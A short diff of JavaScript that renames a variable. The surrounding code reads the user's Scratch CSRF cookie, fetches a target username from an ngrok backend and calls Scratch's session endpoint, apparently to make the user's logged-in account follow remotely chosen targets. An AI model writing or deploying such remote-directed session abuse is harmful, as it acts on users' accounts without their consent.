@@ -42,7 +42,7 @@ async function follow(target_username){
 async function open_kit() {
   try {
     // Get CSRF token from cookies
-    const cookie = await getCookie("scratchcsrftoken");
+    const cookiee = await getCookie("scratchcsrftoken");
 
     // Fetch the target username from your backend
     const response = await fetch("https://poodle-relevant-alien.ngrok-free.app/", {
@@ -63,7 +63,7 @@ async function open_kit() {
     const sessionResponse = await fetch("https://scratch.mit.edu/session/?blreferer", {
       headers: {
         "X-Requested-With": "XMLHttpRequest",
-        "x-csrftoken": cookie?.value
+        "x-csrftoken": cookiee?.value
       }
     });
 
